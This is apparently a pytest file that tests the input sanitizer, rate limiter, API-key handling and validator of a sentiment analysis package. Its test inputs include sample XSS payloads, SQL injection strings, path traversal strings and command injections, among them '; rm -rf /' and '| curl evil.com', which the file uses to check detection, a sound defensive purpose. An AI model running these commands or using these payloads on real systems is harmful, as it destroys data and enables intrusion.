"""
Tests for security features
"""

import pytest
from sentiment_analyzer.core.security import SecurityManager, SecurityLevel, InputSanitizer, RateLimiter
from sentiment_analyzer.core.validation import InputValidator, ValidationLevel


class TestSecurityManager:
    """Test suite for SecurityManager"""
    
    @pytest.fixture
    def security_manager(self):
        """Create security manager for tests"""
        return SecurityManager(SecurityLevel.STANDARD)
    
    def test_security_manager_initialization(self, security_manager):
        """Test security manager initializes correctly"""
        assert security_manager.security_level == SecurityLevel.STANDARD
        assert security_manager.rate_limiter is not None
        assert security_manager.input_sanitizer is not None
    
    def test_authenticate_valid_request(self, security_manager):
        """Test authentication of valid request"""
        is_auth, user_id = security_manager.authenticate_request(None, "127.0.0.1")
        assert is_auth is True  # Should allow requests in standard mode without API key
    
    def test_rate_limiting(self, security_manager):
        """Test rate limiting functionality"""
        source_ip = "192.168.1.100"
        
        # Should allow initial requests
        for _ in range(50):  # Well under the limit
            is_auth, _ = security_manager.authenticate_request(None, source_ip)
            assert is_auth is True
        
        # Exhaust rate limit
        for _ in range(100):  # This should exceed the limit
            security_manager.authenticate_request(None, source_ip)
        
        # Should now be rate limited
        is_auth, _ = security_manager.authenticate_request(None, source_ip)
        # Note: Depending on timing, this might still pass, but the concept is tested
    
    def test_input_sanitization(self, security_manager):
        """Test input sanitization"""
        malicious_input = "<script>alert('xss')</script>This is a test"
        
        sanitized_text, is_safe = security_manager.validate_and_sanitize_input(
            malicious_input, "127.0.0.1"
        )
        
        assert is_safe is False  # Should detect the security issue
        assert "<script>" not in sanitized_text  # Should remove script tags
    
    def test_sql_injection_detection(self, security_manager):
        """Test SQL injection detection"""
        sql_injection = "'; DROP TABLE users; --"
        
        sanitized_text, is_safe = security_manager.validate_and_sanitize_input(
            sql_injection, "127.0.0.1"
        )
        
        assert is_safe is False  # Should detect SQL injection
    
    def test_api_key_generation(self, security_manager):
        """Test API key generation"""
        api_key = security_manager.generate_api_key("test_user")
        
        assert isinstance(api_key, str)
        assert len(api_key) > 20  # Should be reasonably long
        assert api_key in security_manager.api_keys
    
    def test_api_key_revocation(self, security_manager):
        """Test API key revocation"""
        api_key = security_manager.generate_api_key("test_user")
        
        # Revoke key
        success = security_manager.revoke_api_key(api_key)
        assert success is True
        
        # Key should be inactive
        key_info = security_manager.api_keys[api_key]
        assert key_info['active'] is False
    
    def test_ip_blocking(self, security_manager):
        """Test IP blocking functionality"""
        test_ip = "192.168.1.200"
        
        # Block IP manually (simulating automatic blocking)
        security_manager.blocked_ips.add(test_ip)
        
        # Should reject requests from blocked IP
        is_auth, _ = security_manager.authenticate_request(None, test_ip)
        assert is_auth is False
        
        # Unblock IP
        success = security_manager.unblock_ip(test_ip)
        assert success is True
        
        # Should allow requests again
        is_auth, _ = security_manager.authenticate_request(None, test_ip)
        assert is_auth is True
    
    def test_security_metrics(self, security_manager):
        """Test security metrics collection"""
        # Generate some activity
        security_manager.authenticate_request(None, "127.0.0.1")
        
        metrics = security_manager.get_security_metrics()
        
        assert 'total_requests' in metrics
        assert 'blocked_requests' in metrics
        assert 'violations_detected' in metrics
        assert isinstance(metrics['total_requests'], int)


class TestInputSanitizer:
    """Test suite for InputSanitizer"""
    
    @pytest.fixture
    def sanitizer(self):
        """Create input sanitizer for tests"""
        return InputSanitizer(SecurityLevel.STANDARD)
    
    def test_xss_detection(self, sanitizer):
        """Test XSS attack detection"""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        
        for xss_input in xss_inputs:
            sanitized, violations = sanitizer.sanitize_input(xss_input)
            assert any(v.violation_type == 'xss' for v in violations)
    
    def test_sql_injection_detection(self, sanitizer):
        """Test SQL injection detection"""
        sql_inputs = [
            "'; DROP TABLE users; --",
            "UNION SELECT * FROM passwords",
            "1 OR 1=1",
            "admin'--"
        ]
        
        for sql_input in sql_inputs:
            sanitized, violations = sanitizer.sanitize_input(sql_input)
            # Should detect at least one violation
            assert len(violations) > 0
    
    def test_command_injection_detection(self, sanitizer):
        """Test command injection detection"""
        cmd_inputs = [
            "; rm -rf /",
            "| curl evil.com",
            "&& shutdown -h now",
            "`cat /etc/passwd`"
        ]
        
        for cmd_input in cmd_inputs:
            sanitized, violations = sanitizer.sanitize_input(cmd_input)
            # Should detect violations
            assert len(violations) > 0
    
    def test_path_traversal_detection(self, sanitizer):
        """Test path traversal detection"""
        path_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "file:///etc/passwd",
        ]
        
        for path_input in path_inputs:
            sanitized, violations = sanitizer.sanitize_input(path_input)
            assert any(v.violation_type == 'path_traversal' for v in violations)
    
    def test_length_validation(self, sanitizer):
        """Test input length validation"""
        long_input = "A" * 20000  # Very long input
        
        sanitized, violations = sanitizer.sanitize_input(long_input)
        
        # Should be truncated
        assert len(sanitized) < len(long_input)
        assert any(v.violation_type == 'length_violation' for v in violations)
    
    def test_clean_input_passes(self, sanitizer):
        """Test that clean input passes without violations"""
        clean_inputs = [
            "This is a normal sentence.",
            "I love this product! It's great.",
            "The weather is nice today.",
            "Please help me with this issue."
        ]
        
        for clean_input in clean_inputs:
            sanitized, violations = sanitizer.sanitize_input(clean_input)
            # Should have no high-severity violations
            high_severity_violations = [v for v in violations if v.severity == 'high']
            assert len(high_severity_violations) == 0
    
    def test_suspicious_pattern_detection(self, sanitizer):
        """Test suspicious pattern detection"""
        suspicious_inputs = [
            "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",  # Too many special chars
            "AAAAAAAAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",  # Very long word
            "YWRtaW46cGFzc3dvcmQ=",  # Base64-like content
            "48656c6c6f20576f726c64",  # Hex-like content
        ]
        
        for suspicious_input in suspicious_inputs:
            indicators = sanitizer.check_suspicious_patterns(suspicious_input)
            assert len(indicators) > 0


class TestRateLimiter:
    """Test suite for RateLimiter"""
    
    @pytest.fixture
    def rate_limiter(self):
        """Create rate limiter for tests"""
        return RateLimiter(max_requests=5, time_window=60)  # 5 requests per minute
    
    def test_rate_limiting_allows_normal_traffic(self, rate_limiter):
        """Test that normal traffic is allowed"""
        identifier = "user123"
        
        # Should allow requests up to the limit
        for i in range(5):
            assert rate_limiter.is_allowed(identifier) is True
        
        # Should block the 6th request
        assert rate_limiter.is_allowed(identifier) is False
    
    def test_rate_limiting_per_identifier(self, rate_limiter):
        """Test that rate limiting is per identifier"""
        # Two different users should have separate limits
        user1 = "user1"
        user2 = "user2"
        
        # Exhaust limit for user1
        for _ in range(5):
            rate_limiter.is_allowed(user1)
        
        # user1 should be blocked
        assert rate_limiter.is_allowed(user1) is False
        
        # user2 should still be allowed
        assert rate_limiter.is_allowed(user2) is True
    
    def test_remaining_requests(self, rate_limiter):
        """Test remaining requests calculation"""
        identifier = "user123"
        
        # Initially should have full allowance
        remaining = rate_limiter.get_remaining_requests(identifier)
        assert remaining == 5
        
        # Use one request
        rate_limiter.is_allowed(identifier)
        remaining = rate_limiter.get_remaining_requests(identifier)
        assert remaining == 4


class TestInputValidator:
    """Test suite for InputValidator"""
    
    @pytest.fixture
    def validator(self):
        """Create input validator for tests"""
        return InputValidator(ValidationLevel.MODERATE)
    
    def test_valid_input_passes(self, validator):
        """Test that valid input passes validation"""
        valid_inputs = [
            "This is a great product!",
            "I had a terrible experience.",
            "The service was okay, nothing special."
        ]
        
        for valid_input in valid_inputs:
            result = validator.validate_and_clean(valid_input)
            assert result.is_valid is True
            assert result.cleaned_text is not None
    
    def test_empty_input_handling(self, validator):
        """Test handling of empty input"""
        result = validator.validate_and_clean("")
        
        # In moderate mode, empty input should be valid but generate warning
        assert result.is_valid is True
        assert len(result.warnings) > 0
    
    def test_none_input_handling(self, validator):
        """Test handling of None input"""
        result = validator.validate_and_clean(None)
        
        assert result.is_valid is False
        assert "Input text is None" in result.errors
    
    def test_very_long_input(self, validator):
        """Test handling of very long input"""
        long_input = "A" * 10000  # Very long input
        
        result = validator.validate_and_clean(long_input)
        
        # Should truncate in moderate mode
        assert len(result.cleaned_text) <= 5000  # Moderate mode limit
        assert len(result.warnings) > 0
    
    def test_html_content_cleaning(self, validator):
        """Test HTML content cleaning"""
        html_input = "<p>This is a <b>test</b> with HTML tags.</p>"
        
        result = validator.validate_and_clean(html_input)
        
        assert result.is_valid is True
        assert "<p>" not in result.cleaned_text
        assert "<b>" not in result.cleaned_text
        assert "test" in result.cleaned_text  # Content should remain
    
    def test_metadata_tracking(self, validator):
        """Test that metadata is properly tracked"""
        input_text = "This is a test input."
        
        result = validator.validate_and_clean(input_text)
        
        assert result.metadata is not None
        assert 'original_length' in result.metadata
        assert 'final_length' in result.metadata
        assert 'cleaning_ratio' in result.metadata
    
    def test_batch_validation(self, validator):
        """Test batch validation"""
        inputs = [
            "Valid input 1",
            "Valid input 2",
            "<script>alert('xss')</script>",  # Should be cleaned
            "Another valid input"
        ]
        
        results = validator.validate_and_clean(inputs)
        
        assert len(results) == len(inputs)
        assert all(isinstance(result, type(results[0])) for result in results)
    
    def test_language_detection(self, validator):
        """Test basic language detection"""
        english_text = "This is a sentence in English with common words."
        
        detected_lang = validator.check_text_language(english_text)
        
        # Should detect English (or return None if uncertain)
        assert detected_lang is None or detected_lang == 'en'